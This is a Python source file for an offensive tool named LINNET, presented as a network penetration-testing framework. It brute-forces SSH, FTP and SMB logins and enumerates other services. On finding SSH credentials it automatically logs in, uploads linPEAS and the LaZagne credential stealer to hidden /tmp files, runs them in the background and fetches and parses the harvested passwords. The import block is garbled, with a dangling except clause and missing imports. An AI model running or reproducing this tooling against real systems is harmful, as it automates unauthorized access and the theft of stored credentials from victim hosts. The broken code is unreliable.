  #!/usr/bin/env python3

import argparse
import subprocess
import os
import re
import json
import time
import threading 
except ImportError:
    PARAMIKO_OK = False
    print("[!] paramiko not found — Auto-SSH disabled. Run: pip install paramiko")

BANNER = r"""
██╗     ██╗███╗   ██╗███╗   ██╗███████╗████████╗
██║     ██║████╗  ██║████╗  ██║██╔════╝╚══██╔══╝
██║     ██║██╔██╗ ██║██╔██╗ ██║█████╗     ██║   
██║     ██║██║╚██╗██║██║╚██╗██║██╔══╝     ██║   
███████╗██║██║ ╚████║██║ ╚████║███████╗   ██║   
╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝   ╚═╝   

LINNET - Linux Network VAPT Framework
Service-Based Enumeration | Controlled Brute-Force | CVE Lookup | HTML Report
Auto-SSH Post-Exploitation | linPEAS | LaZagne
"""

# ================================================================== #
#  GLOBAL TRACKING                                                     #
# ================================================================== #

_start_time        = ""
_command_log       = []
_cve_results       = []
_module_data       = {}
_cred_log          = []
_post_findings     = {}
_proof_log         = {}
_postexploit_done  = set()

_flag_linuxprivesc = False
_flag_lazagne      = False

_lock = threading.Lock()

def _track_cmd(cmd):
    with _lock:
        _command_log.append(cmd)

def _module_finding(module_name, finding):
    with _lock:
        if module_name not in _module_data:
            _module_data[module_name] = {"run": True, "findings": []}
        _module_data[module_name]["findings"].append(finding)

def _module_ran(module_name):
    with _lock:
        if module_name not in _module_data:
            _module_data[module_name] = {"run": True, "findings": []}
        else:
            _module_data[module_name]["run"] = True

def _add_proof(service, proof_lines):
    with _lock:
        if service not in _proof_log:
            _proof_log[service] = []
        _proof_log[service].append(proof_lines)

def _add_cred(service, user, password, target, trigger_postexploit=True):
    with _lock:
        _cred_log.append({
            "service":  service,
            "user":     user,
            "password": password,
            "target":   target,
            "time":     datetime.now().strftime("%H:%M:%S")
        })
    print(f"\n  [!!!] CREDENTIAL FOUND — {service} | {user}:{password} @ {target}\n")

    if trigger_postexploit and service.upper() == "SSH" and PARAMIKO_OK:
        if _flag_linuxprivesc or _flag_lazagne:
            with _lock:
                already = target in _postexploit_done
                if not already:
                    _postexploit_done.add(target)
            if not already:
                print(f"  [>>>] Auto-SSH post-exploit hook triggered for {user}@{target} (first cred only)")
                t = threading.Thread(
                    target=_auto_ssh_postexploit,
                    args=(target, user, password),
                    daemon=False
                )
                t.start()
            else:
                print(f"  [>>>] Post-exploit already running for {target} — skipping duplicate trigger")


# ================================================================== #
#  CORE run() — FIXED: non-blocking, no stdin, streaming output       #
# ================================================================== #

def run(cmd, capture=False, timeout=300):
    """
    Execute a shell command safely.
    - stdin  → /dev/null  (prevents ANY interactive pause / Enter prompt)
    - stderr → merged into stdout so output isn't lost
    - timeout → hard kill after `timeout` seconds (default 5 min)
    - capture=True  → return output string
    - capture=False → stream to terminal live, return ""
    """
    print(f"\n[+] Executing: {cmd}\n")
    _track_cmd(cmd)

    # Always pass stdin=DEVNULL so tools can't block waiting for input
    stdin_src = subprocess.DEVNULL

    if capture:
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                stdin=stdin_src,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,       # separate so we can return only stdout
                timeout=timeout,
                env={**os.environ, "DEBIAN_FRONTEND": "noninteractive"}
            )
            return result.stdout.decode(errors="replace")
        except subprocess.TimeoutExpired:
            print(f"[!] Command timed out after {timeout}s: {cmd[:80]}")
            return ""
        except Exception as e:
            print(f"[!] run() error: {e}")
            return ""
    else:
        try:
            proc = subprocess.Popen(
                cmd,
                shell=True,
                stdin=stdin_src,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,     # merge stderr → stdout for live display
                env={**os.environ, "DEBIAN_FRONTEND": "noninteractive"}
            )
            # Stream output line-by-line so terminal stays live
            try:
                for raw_line in iter(proc.stdout.readline, b""):
                    try:
                        print(raw_line.decode(errors="replace"), end="", flush=True)
                    except Exception:
                        pass
                proc.stdout.close()
                proc.wait(timeout=timeout)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
                print(f"\n[!] Command killed after {timeout}s timeout: {cmd[:80]}")
        except Exception as e:
            print(f"[!] run() Popen error: {e}")
        return ""


# ================================================================== #
#  SERVICE PROOF-OF-ACCESS                                             #
# ================================================================== #

def _proof_ssh(target, user, password, port=22):
    if not PARAMIKO_OK:
        return None
    print(f"\n  [PROOF-SSH] Verifying access for {user}@{target}...")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=target, port=port, username=user, password=password,
                       timeout=10, look_for_keys=False, allow_agent=False)
        results = {}
        for label, cmd in [
            ("id",          "id"),
            ("whoami",      "whoami"),
            ("hostname",    "hostname"),
            ("uname",       "uname -a"),
            ("ifconfig",    "ip addr 2>/dev/null || ifconfig 2>/dev/null || echo 'N/A'"),
            ("passwd_tail", "tail -5 /etc/passwd 2>/dev/null || echo 'N/A'"),
        ]:
            try:
                _, stdout, _ = client.exec_command(cmd, timeout=8)
                results[label] = stdout.read().decode("utf-8", errors="replace").strip()
            except Exception:
                results[label] = "N/A"
        client.close()
        proof = {"service": "SSH", "target": target, "user": user, "data": results}
        _add_proof("SSH", proof)
        _module_finding("SSH", f"✓ PROOF: id={results.get('id','?')} hostname={results.get('hostname','?')}")
        print(f"  [PROOF-SSH] ✓ id: {results.get('id','?')}")
        return proof
    except Exception as e:
        print(f"  [PROOF-SSH] ✗ Failed: {e}")
        return None


def _proof_ftp(target, user, password, port=21):
    print(f"\n  [PROOF-FTP] Verifying access for {user}@{target}...")
    try:
        import ftplib
        ftp = ftplib.FTP()
        ftp.connect(target, port, timeout=10)
        ftp.login(user, password)
        lines = []
        try:
            ftp.retrlines("LIST", lines.append)
        except Exception:
            pass
        welcome = ftp.getwelcome()
        try:
            pwd = ftp.pwd()
        except Exception:
            pwd = "/"
        ftp.quit()
        listing = "\n".join(lines[:20]) if lines else "(empty listing)"
        proof = {
            "service": "FTP", "target": target, "user": user,
            "data": {"welcome": welcome, "pwd": pwd, "listing": listing}
        }
        _add_proof("FTP", proof)
        _module_finding("FTP", f"✓ PROOF: FTP listing obtained ({len(lines)} entries)")
        print(f"  [PROOF-FTP] ✓ Directory listing: {len(lines)} entries")
        return proof
    except Exception as e:
        print(f"  [PROOF-FTP] ✗ Failed: {e}")
        return None


def _proof_smb(target, user, password):
    print(f"\n  [PROOF-SMB] Verifying access for {user}@{target}...")
    try:
        cmd = f"smbclient -L //{target} -U '{user}%{password}' --no-pass 2>/dev/null || " \
              f"smbclient -L //{target} -U '{user}%{password}' 2>&1 || true"
        _track_cmd(f"smbclient -L //{target} -U {user}%***")
        out = subprocess.check_output(cmd, shell=True, timeout=15,
                                      stdin=subprocess.DEVNULL,
                                      stderr=subprocess.STDOUT).decode(errors="replace")
        proof = {
            "service": "SMB", "target": target, "user": user,
            "data": {"shares": out.strip()[:1000]}
        }
        _add_proof("SMB", proof)
        _module_finding("SMB", "✓ PROOF: SMB share listing obtained")
        print(f"  [PROOF-SMB] ✓ Share listing obtained")
        return proof
    except Exception as e:
        print(f"  [PROOF-SMB] ✗ Failed: {e}")
        return None


def _proof_mysql(target, user, password, port=3306):
    print(f"\n  [PROOF-MySQL] Verifying access for {user}@{target}...")
    try:
        def _mysql_cmd(sql):
            cmd = (f"mysql -h {target} -P {port} -u '{user}' "
                   f"-p'{password}' -e \"{sql}\" 2>/dev/null || true")
            _track_cmd(f"mysql -h {target} -u {user} -e \"{sql}\"")
            return subprocess.check_output(cmd, shell=True, timeout=10,
                                           stdin=subprocess.DEVNULL,
                                           stderr=subprocess.DEVNULL).decode(errors="replace").strip()
        dbs     = _mysql_cmd("SHOW DATABASES;")
        version = _mysql_cmd("SELECT VERSION();")
        user_db = _mysql_cmd("SELECT user, host FROM mysql.user LIMIT 10;")
        tables  = ""
        for line in dbs.splitlines():
            db = line.strip()
            if db and db not in ("Database", "information_schema", "mysql", "performance_schema"):
                tables = _mysql_cmd(f"SHOW TABLES FROM `{db}`;")
                if tables:
                    tables = f"[{db}]\n{tables}"
                    break
        proof = {
            "service": "MySQL", "target": target, "user": user,
            "data": {"version": version, "databases": dbs, "users": user_db, "tables": tables or "(none found)"}
        }
        _add_proof("MySQL", proof)
        _module_finding("MySQL", f"✓ PROOF: MySQL access confirmed, version={version.split(chr(10))[-1]}")
        print(f"  [PROOF-MySQL] ✓ Access confirmed: {version.split(chr(10))[-1]}")
        return proof
    except Exception as e:
        print(f"  [PROOF-MySQL] ✗ Failed: {e}")
        return None


def _proof_http(target, port=80):
    print(f"\n  [PROOF-HTTP] Gathering HTTP info for {target}...")
    try:
        import urllib.request as ur
        req = ur.Request(f"http://{target}:{port}/", headers={"User-Agent": "LINNET-VAPT/2.0"})
        with ur.urlopen(req, timeout=10) as r:
            headers = dict(r.headers)
            body    = r.read(512).decode(errors="replace")
        proof = {
            "service": "HTTP", "target": target, "user": "anonymous",
            "data": {
                "status":       str(r.status),
                "server":       headers.get("Server", "N/A"),
                "headers":      "\n".join(f"{k}: {v}" for k, v in list(headers.items())[:12]),
                "body_preview": body[:200]
            }
        }
        _add_proof("HTTP", proof)
        _module_finding("HTTP", f"✓ PROOF: HTTP {r.status} | Server: {headers.get('Server','?')}")
        print(f"  [PROOF-HTTP] ✓ HTTP {r.status} | Server: {headers.get('Server','?')}")
        return proof
    except Exception as e:
        print(f"  [PROOF-HTTP] ✗ Failed: {e}")
        return None


def _proof_dns(target):
    print(f"\n  [PROOF-DNS] Verifying DNS on {target}...")
    try:
        cmd = f"dig @{target} version.bind chaos txt +short 2>/dev/null; " \
              f"dig @{target} . NS +short 2>/dev/null | head -5; true"
        _track_cmd(f"dig @{target} version.bind")
        out = subprocess.check_output(cmd, shell=True, timeout=10,
                                      stdin=subprocess.DEVNULL,
                                      stderr=subprocess.DEVNULL).decode(errors="replace").strip()
        proof = {
            "service": "DNS", "target": target, "user": "anonymous",
            "data": {"response": out[:500] or "(no response)"}
        }
        _add_proof("DNS", proof)
        _module_finding("DNS", "✓ PROOF: DNS query response captured")
        print(f"  [PROOF-DNS] ✓ DNS response obtained")
        return proof
    except Exception as e:
        print(f"  [PROOF-DNS] ✗ Failed: {e}")
        return None


def _proof_snmp(target, community):
    print(f"\n  [PROOF-SNMP] Walking SNMP with community '{community}' on {target}...")
    try:
        cmd = f"snmpwalk -v2c -c {community} -t 2 -r 1 {target} sysDescr 2>/dev/null | head -5; true"
        _track_cmd(f"snmpwalk -v2c -c {community} {target} sysDescr")
        out = subprocess.check_output(cmd, shell=True, timeout=10,
                                      stdin=subprocess.DEVNULL,
                                      stderr=subprocess.DEVNULL).decode(errors="replace").strip()
        proof = {
            "service": "SNMP", "target": target, "user": community,
            "data": {"sysDescr": out[:500] or "(no data)"}
        }
        _add_proof("SNMP", proof)
        _module_finding("SNMP", f"✓ PROOF: SNMP walk successful (community={community})")
        print(f"  [PROOF-SNMP] ✓ SNMP walk response obtained")
        return proof
    except Exception as e:
        print(f"  [PROOF-SNMP] ✗ Failed: {e}")
        return None


def _proof_smtp(target, port=25):
    print(f"\n  [PROOF-SMTP] Connecting to SMTP on {target}...")
    try:
        import socket
        s = socket.create_connection((target, port), timeout=10)
        banner = s.recv(1024).decode(errors="replace").strip()
        s.sendall(b"EHLO linnet.vapt\r\n")
        time.sleep(0.5)
        ehlo = s.recv(2048).decode(errors="replace").strip()
        s.sendall(b"QUIT\r\n")
        s.close()
        proof = {
            "service": "SMTP", "target": target, "user": "anonymous",
            "data": {"banner": banner[:200], "ehlo": ehlo[:500]}
        }
        _add_proof("SMTP", proof)
        _module_finding("SMTP", f"✓ PROOF: SMTP banner: {banner[:80]}")
        print(f"  [PROOF-SMTP] ✓ Banner: {banner[:80]}")
        return proof
    except Exception as e:
        print(f"  [PROOF-SMTP] ✗ Failed: {e}")
        return None


# ================================================================== #
#  AUTO SSH POST-EXPLOITATION ENGINE                                   #
# ================================================================== #

def _ssh_connect(target, user, password, port=22, retries=3):
    if not PARAMIKO_OK:
        return None
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for attempt in range(1, retries + 1):
        try:
            print(f"  [SSH] Connecting {user}@{target}:{port} (attempt {attempt}/{retries})...")
            client.connect(hostname=target, port=port, username=user, password=password,
                           timeout=15, banner_timeout=15, auth_timeout=15,
                           look_for_keys=False, allow_agent=False)
            print(f"  [SSH] ✓ Connected successfully as {user}@{target}")
            return client
        except paramiko.AuthenticationException:
            print(f"  [SSH] ✗ Auth failed for {user}@{target}")
            return None
        except Exception as e:
            print(f"  [SSH] ✗ Connection error: {e}")
            if attempt < retries:
                time.sleep(2)
    return None


def _ssh_run_command(client, cmd, timeout=30):
    print(f"  [SSH-EXEC] {cmd[:80]}{'...' if len(cmd)>80 else ''}")
    _track_cmd(f"[SSH] {cmd}")
    try:
        _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
        out = stdout.read().decode("utf-8", errors="replace")
        err = stderr.read().decode("utf-8", errors="replace")
        rc  = stdout.channel.recv_exit_status()
        return out, err, rc
    except Exception as e:
        print(f"  [SSH-EXEC] Error: {e}")
        return "", str(e), -1


def _notify_output_ready(label, outfile, size_bytes):
    size_kb = size_bytes // 1024
    print("\a\a\a", end="", flush=True)
    banner = f"""
\033[1;32m
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   ✅  OUTPUT READY — {label:<10}                         ║
║                                                          ║
║   📄  File  : {outfile:<43} ║
║   📦  Size  : {str(size_kb)+"KB":<43} ║
║   🕐  Time  : {datetime.now().strftime("%H:%M:%S"):<43} ║
║                                                          ║
║   cat {outfile:<51} ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
\033[0m"""
    print(banner, flush=True)
    try:
        subprocess.Popen(["notify-send", f"LINNET — {label} Ready",
                          f"Output saved: {outfile} ({size_kb}KB)",
                          "--urgency=critical", "--expire-time=10000"],
                         stdin=subprocess.DEVNULL,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
    except Exception:
        pass


def _ssh_run_background(target, user, password, port=22, cmd="", outfile="out.txt", label="TASK"):
    remote_out = f"/tmp/.lnnt_{label.lower()}_{os.getpid()}.out"
    wrapped    = f"nohup bash -c '{cmd} > {remote_out} 2>&1' > /dev/null 2>&1 &"
    _track_cmd(f"[SSH-BG] {cmd[:80]}")

    poll_client = _ssh_connect(target, user, password, port, retries=3)
    if not poll_client:
        print(f"  [{label}] ✗ Could not open dedicated SSH connection — aborting")
        _module_finding(label, "✗ Dedicated SSH connection failed — output will NOT be fetched")
        return None

    print(f"  [{label}] Launching '{cmd[:60]}...' in background on {target}...")
    try:
        poll_client.exec_command(wrapped, timeout=10)
    except Exception as e:
        print(f"  [{label}] ✗ Launch error: {e}")
        poll_client.close()
        return None

    def _poll_and_fetch():
        max_wait   = 600
        interval   = 10
        stable_for = 20
        waited     = 0
        last_size  = -1
        stable_sec = 0

        print(f"  [{label}] ✓ Job fired — polling for completion (max {max_wait}s)...")
        try:
            while waited < max_wait:
                time.sleep(interval)
                waited += interval
                try:
                    _, stdout, _ = poll_client.exec_command(
                        f"stat -c%s {remote_out} 2>/dev/null || echo 0", timeout=10)
                    raw_size = stdout.read().decode(errors="replace").strip()
                    current_size = int(raw_size) if raw_size.isdigit() else 0
                except Exception:
                    current_size = 0

                if current_size > 0 and current_size == last_size:
                    stable_sec += interval
                else:
                    stable_sec = 0
                last_size = current_size

                if waited >= 30 and stable_sec >= stable_for:
                    print(f"\n  [{label}] Output stable at {current_size} bytes — fetching...")
                    break

                if waited % 60 == 0 and waited > 0:
                    print(f"\n  [{label}] Still running... ({waited}s elapsed, {current_size} bytes so far)")
            else:
                print(f"\n  [{label}] ⚠ Timeout ({max_wait}s) — fetching partial output...")

            fetched = False
            for attempt in range(1, 4):
                try:
                    print(f"  [{label}] SFTP fetch attempt {attempt}/3...")
                    sftp = poll_client.open_sftp()
                    sftp.get(remote_out, outfile)
                    try:
                        sftp.remove(remote_out)
                    except Exception:
                        pass
                    sftp.close()
                    fetched = True
                    print(f"  [{label}] ✓ File fetched → {outfile}")
                    break
                except Exception as e:
                    print(f"  [{label}] ✗ SFTP attempt {attempt} failed: {e}")
                    time.sleep(3)

            if not fetched:
                print(f"  [{label}] ✗ All SFTP attempts failed.")
                print(f"  [{label}]   Manual fetch: sftp {user}@{target}:{remote_out} ./{outfile}")
                _module_finding(label, f"✗ SFTP fetch failed — manual: sftp {user}@{target}:{remote_out}")
                return

            clean = ""
            try:
                with open(outfile, "r", encoding="utf-8", errors="replace") as f:
                    raw = f.read()
                clean = re.sub(r'\x1b\[[0-9;]*[mK]', '', raw)
                with open(outfile, "w", encoding="utf-8") as f:
                    f.write(clean)
                _module_finding(label, f"✓ Complete — {len(clean)} chars saved to {outfile}")
                print(f"  [{label}] ✓ ANSI stripped — {len(clean)} chars written to {outfile}")
            except Exception as e:
                _module_finding(label, f"Output fetched but strip failed: {e}")

            if label == "linPEAS" and clean:
                _parse_linpeas_findings(clean, outfile)
            elif label == "LaZagne" and clean:
                _parse_lazagne_creds(clean, target)

            _notify_output_ready(label, outfile, len(clean.encode("utf-8", errors="replace")))

        finally:
            try:
                poll_client.close()
                print(f"  [{label}] Dedicated SSH connection closed.")
            except Exception:
                pass

    t = threading.Thread(target=_poll_and_fetch, name=f"poll-{label}", daemon=False)
    t.start()
    return t


def _ssh_upload_file(client, local_path, remote_path):
    try:
        sftp = client.open_sftp()
        sftp.put(local_path, remote_path)
        sftp.chmod(remote_path, 0o755)
        sftp.close()
        print(f"  [SFTP] ✓ Uploaded {local_path} → {remote_path}")
        return True
    except Exception as e:
        print(f"  [SFTP] ✗ Upload failed: {e}")
        return False


def _auto_ssh_postexploit(target, user, password, port=22):
    key = f"{target}:{user}"
    with _lock:
        if key not in _post_findings:
            _post_findings[key] = {"target": target, "user": user, "linpeas": None, "lazagne": None}
    _module_ran("AutoSSH")
    print(f"\n{'='*60}")
    print(f"  [AUTO-SSH] Post-exploitation starting")
    print(f"  [AUTO-SSH] {user}@{target}:{port}")
    print(f"{'='*60}\n")
    client = _ssh_connect(target, user, password, port)
    if not client:
        _module_finding("AutoSSH", f"✗ Connection failed for {user}@{target}")
        return
    out, _, _ = _ssh_run_command(client, "id && uname -a", timeout=10)
    identity  = out.strip()[:100]
    print(f"  [AUTO-SSH] Access confirmed: {identity}")
    _module_finding("AutoSSH", f"✓ Access: {identity}")

    if _flag_linuxprivesc:
        outfile = _run_linpeas_over_ssh(client, target, user, password, port)
        if outfile:
            with _lock:
                _post_findings[key]["linpeas"] = outfile

    if _flag_lazagne:
        outfile = _run_lazagne_over_ssh(client, target, user, password, port)
        if outfile:
            with _lock:
                _post_findings[key]["lazagne"] = outfile

    print(f"\n  [AUTO-SSH] ✓ Jobs launched in background — terminal is free")
    _module_finding("AutoSSH", "Background jobs launched — output files auto-saved when complete")


def _run_linpeas_over_ssh(client, target, user, password, port=22):
    print(f"\n  [linPEAS] Preparing for {user}@{target}...")
    _module_ran("PrivEsc")
    linpeas_src = "/usr/share/peass/linpeas/linpeas.sh"
    remote_sh   = "/tmp/.linpeas_lnnt.sh"
    outfile     = f"linpeas_{target.replace('.','_')}_{user}.txt"
    if not os.path.exists(linpeas_src):
        print("  [linPEAS] ✗ linpeas.sh not found — skipping")
        _module_finding("PrivEsc", "linpeas.sh not found at /usr/share/peass/linpeas/")
        return None
    ok = _ssh_upload_file(client, linpeas_src, remote_sh)
    if not ok:
        _module_finding("PrivEsc", "SFTP upload failed — linPEAS skipped")
        return None
    _module_finding("PrivEsc", "linPEAS uploaded → background poller starting (dedicated SSH)")
    _ssh_run_background(target=target, user=user, password=password, port=port,
                        cmd=f"bash {remote_sh} -a", outfile=outfile, label="linPEAS")
    return outfile


def _run_lazagne_over_ssh(client, target, user, password, port=22):
    print(f"\n  [LaZagne] Preparing for {user}@{target}...")
    _module_ran("LaZagne")
    lazagne_src = "/root/LaZagne/Linux/laZagne.py"
    remote_py   = "/tmp/.lazagne_lnnt.py"
    outfile     = f"lazagne_{target.replace('.','_')}_{user}.txt"
    if not os.path.exists(lazagne_src):
        print("  [LaZagne] ✗ laZagne.py not found — skipping")
        _module_finding("LaZagne", "laZagne.py not found at /root/LaZagne/Linux/")
        return None
    ok = _ssh_upload_file(client, lazagne_src, remote_py)
    if not ok:
        _module_finding("LaZagne", "SFTP upload failed — LaZagne skipped")
        return None
    _module_finding("LaZagne", "LaZagne uploaded → background poller starting (dedicated SSH)")
    _ssh_run_background(target=target, user=user, password=password, port=port,
                        cmd=f"python3 {remote_py} all", outfile=outfile, label="LaZagne")
    return outfile


# ================================================================== #
#  LINPEAS OUTPUT PARSER                                               #
# ================================================================== #

def _parse_linpeas_findings(output, filename):
    interesting_patterns = [
        (r'(?i)(sudo -l.*)',                     "Sudo rights"),
        (r'(?i)(SUID.*)',                         "SUID binary"),
        (r'(?i)(writable.*cron.*)',               "Writable cron"),
        (r'(?i)(password\s*=\s*\S+)',             "Password in file"),
        (r'(?i)(CVE-\d{4}-\d+)',                  "CVE mentioned"),
        (r'(?i)(id_rsa|id_ecdsa|id_ed25519)',     "SSH private key found"),
        (r'(?i)(\.bash_history)',                  "bash_history readable"),
    ]
    hits = []
    for pattern, label in interesting_patterns:
        for m in re.findall(pattern, output)[:3]:
            hits.append(f"{label}: {m.strip()[:80]}")
    if hits:
        print(f"\n  [linPEAS] ★ Interesting findings:")
        for h in hits:
            print(f"    › {h}")
        for h in hits:
            _module_finding("PrivEsc", h)
    else:
        _module_finding("PrivEsc", "No high-value findings auto-detected (check file manually)")


# ================================================================== #
#  CREDENTIAL PARSERS                                                  #
# ================================================================== #

def _parse_medusa_creds(output, service, target):
    found = []
    for line in output.splitlines():
        if "ACCOUNT FOUND" in line or "SUCCESS" in line.upper():
            u = re.search(r'User:\s*(\S+)', line)
            p = re.search(r'Password:\s*(\S+)', line)
            if u and p:
                found.append((u.group(1), p.group(1)))
    for idx, (user, pwd) in enumerate(found):
        _add_cred(service, user, pwd, target, trigger_postexploit=(idx == 0))
    return found


def _parse_cme_creds(output, service, target):
    found = []
    for line in output.splitlines():
        if "[+]" in line:
            m = re.search(r'(\S+\\)?(\S+):(\S+)', line)
            if m:
                user = m.group(2)
                pwd  = m.group(3)
                if user and pwd and len(pwd) < 60:
                    found.append((user, pwd))
    for idx, (user, pwd) in enumerate(found):
        _add_cred(service, user, pwd, target, trigger_postexploit=False)
    return found


def _parse_lazagne_creds(output, target):
    current_module = "LaZagne"
    for line in output.splitlines():
        m = re.match(r'\[\+\]\s+(\w+)', line)
        if m:
            current_module = f"LaZagne-{m.group(1)}"
        u = re.search(r'(?i)username\s*=\s*(\S+)', line)
        p = re.search(r'(?i)password\s*=\s*(\S+)', line)
        if u and p:
            _add_cred(current_module, u.group(1), p.group(1), target, trigger_postexploit=False)
        lp = re.search(r'(?i)login\s*:\s*(\S+).*password\s*:\s*(\S+)', line)
        if lp:
            _add_cred(current_module, lp.group(1), lp.group(2), target, trigger_postexploit=False)


# ================================================================== #
#  SSH MODULE                                                          #
# ================================================================== #

def ssh_module(target):
    print("\n[+] SSH Enumeration + Brute-Force Started\n")
    _module_ran("SSH")

    def _nmap():
        run(f"nmap -p22 -T4 --script ssh-auth-methods,ssh-hostkey {target}")
    def _audit():
        run(f"python3 /root/ssh-audit/ssh-audit.py {target} 2>/dev/null || true")

    t1 = threading.Thread(target=_nmap);  t1.start()
    t2 = threading.Thread(target=_audit); t2.start()
    t1.join(); t2.join()

    userlist = os.path.join(os.getcwd(), "username.txt")
    passlist = os.path.join(os.getcwd(), "password.txt")

    if os.path.exists(userlist) and os.path.exists(passlist):
        out   = run(f"medusa -h {target} -U {userlist} -P {passlist} -M ssh -t 8 2>/dev/null", capture=True)
        found = _parse_medusa_creds(out, "SSH", target)
        _module_finding("SSH", f"Brute-force complete — {len(found)} credential(s) found")
        for user, pwd in found:
            _proof_ssh(target, user, pwd)
    else:
        print("[-] username.txt or password.txt missing!")
        _module_finding("SSH", "Wordlists missing — brute-force skipped")


# ================================================================== #
#  FTP MODULE                                                          #
# ================================================================== #

def ftp_module(target):
    print("\n[+] FTP Enumeration + Brute-Force Started\n")
    _module_ran("FTP")

    run(f"nmap -p21 -T4 --script ftp-anon,ftp-syst {target}")

    userlist = os.path.join(os.getcwd(), "username.txt")
    passlist = os.path.join(os.getcwd(), "password.txt")

    if os.path.exists(userlist) and os.path.exists(passlist):
        out   = run(f"medusa -h {target} -U {userlist} -P {passlist} -M ftp -t 8 2>/dev/null", capture=True)
        found = _parse_medusa_creds(out, "FTP", target)
        _module_finding("FTP", f"Brute-force complete — {len(found)} credential(s) found")
        for user, pwd in found:
            _proof_ftp(target, user, pwd)
    else:
        print("[-] username.txt or password.txt missing!")
        _module_finding("FTP", "Wordlists missing — brute-force skipped")


# ================================================================== #
#  SMB MODULE                                                          #
# ================================================================== #

def smb_module(target):
    print("\n[+] SMB Enumeration + Bruteforce + Share Discovery\n")
    _module_ran("SMB")

    # enum4linux -a can get stuck on prompts — pipe stdin from /dev/null
    run(f"enum4linux -a {target} 2>/dev/null || true")
    _module_finding("SMB", "enum4linux -a executed")

    userlist = os.path.join(os.getcwd(), "username.txt")
    passlist = os.path.join(os.getcwd(), "password.txt")

    if not os.path.exists(userlist) or not os.path.exists(passlist):
        print("[-] username.txt or password.txt missing!")
        _module_finding("SMB", "Wordlists missing — CME skipped")
        return

    out   = run(f"crackmapexec smb {target} -u {userlist} -p {passlist} --shares 2>/dev/null", capture=True)
    found = _parse_cme_creds(out, "SMB", target)
    _module_finding("SMB", f"CrackMapExec complete — {len(found)} credential(s) found")
    for user, pwd in found:
        _proof_smb(target, user, pwd)


# ================================================================== #
#  HTTP MODULE                                                         #
# ================================================================== #

def http_module(target):
    print("\n[+] HTTP Enumeration Started\n")
    _module_ran("HTTP")

    def _nmap_http():
        run(f"nmap -p80,443 -T4 --script http-title,http-headers {target}")
    def _nikto():
        # -maxtime 120 already set; -nointeractive prevents any pause
        run(f"nikto -h http://{target} -maxtime 120 -nointeractive 2>/dev/null || true", timeout=150)

    t1 = threading.Thread(target=_nmap_http); t1.start()
    t2 = threading.Thread(target=_nikto);     t2.start()
    t1.join(); t2.join()

    _module_finding("HTTP", "Nmap + Nikto executed in parallel (Nikto max 120s)")
    _proof_http(target, 80)


# ================================================================== #
#  DNS MODULE                                                          #
# ================================================================== #

def dns_module(target):
    print("\n[+] DNS Enumeration Started\n")
    _module_ran("DNS")

    def _nmap_dns():
        run(f"nmap -p53 -T4 --script dns-brute,dns-recursion {target}")
    def _dig():
        run(f"dig axfr @{target} 2>/dev/null || true", timeout=30)

    t1 = threading.Thread(target=_nmap_dns); t1.start()
    t2 = threading.Thread(target=_dig);      t2.start()
    t1.join(); t2.join()

    _module_finding("DNS", "DNS brute-force + zone transfer (parallel)")
    _proof_dns(target)


# ================================================================== #
#  SNMP MODULE                                                         #
# ================================================================== #

def snmp_module(target):
    print("\n[+] SNMP Community Bruteforce + Targeted Enumeration\n")
    _module_ran("SNMP")

    wordlist = "/usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt"
    if not os.path.exists(wordlist):
        print("[-] SNMP wordlist not found!")
        _module_finding("SNMP", "Wordlist missing — skipped")
        return

    _track_cmd(f"onesixtyone -c {wordlist} {target}")
    try:
        result = subprocess.check_output(
            f"onesixtyone -c {wordlist} {target}",
            shell=True,
            stdin=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=60
        ).decode()
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
        result = ""

    communities = []
    for line in result.splitlines():
        if "[" in line and "]" in line:
            communities.append(line.split("[")[1].split("]")[0])

    if not communities:
        print("[-] No community strings found!")
        _module_finding("SNMP", "No community strings found")
        return

    print(f"[+] Found: {', '.join(communities)}\n")
    _module_finding("SNMP", f"Community strings: {', '.join(communities)}")
    _proof_snmp(target, communities[0])

    oids = [
        "1.3.6.1.2.1.1",
        "1.3.6.1.2.1.25.4.2.1.2",
        "1.3.6.1.2.1.25.6.3.1.2",
        "1.3.6.1.2.1.2.2.1.2",
        "1.3.6.1.2.1.6.13.1.3",
        "1.3.6.1.2.1.7.5.1.2",
        "1.3.6.1.4.1.77.1.2.25"
    ]

    def _walk(community, oid):
        run(f"snmpwalk -v2c -c {community} -t 1 -r 1 {target} {oid} 2>/dev/null || true", timeout=30)

    with ThreadPoolExecutor(max_workers=8) as ex:
        futs = [ex.submit(_walk, c, o) for c in communities for o in oids]
        for f in as_completed(futs):
            pass


# ================================================================== #
#  SMTP MODULE                                                         #
# ================================================================== #

def smtp_module(target):
    print("\n[+] SMTP Enumeration Started\n")
    _module_ran("SMTP")
    run(f"nmap -p25 -T4 --script smtp-enum-users {target}")
    _module_finding("SMTP", "smtp-enum-users executed on port 25")
    _proof_smtp(target, 25)


# ================================================================== #
#  LAZAGNE STANDALONE                                                  #
# ================================================================== #

def lazagne_module():
    print("\n[+] LaZagne Credential Dump (LOCAL MACHINE)\n")
    _module_ran("LaZagne")

    lazagne_path = "/root/LaZagne/Linux/laZagne.py"
    if not os.path.exists(lazagne_path):
        print("[-] laZagne.py not found at /root/LaZagne/Linux/laZagne.py")
        _module_finding("LaZagne", "laZagne.py not found")
        return

    _track_cmd(f"python3 {lazagne_path} all")
    try:
        result = subprocess.run(
            f"python3 {lazagne_path} all",
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            timeout=120
        )
        out = result.stdout.decode(errors="replace")
    except subprocess.TimeoutExpired:
        out = ""
        print("[!] LaZagne timed out after 120s")

    outfile = f"lazagne_local_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(outfile, "w") as f:
        f.write(out)

    print(out)
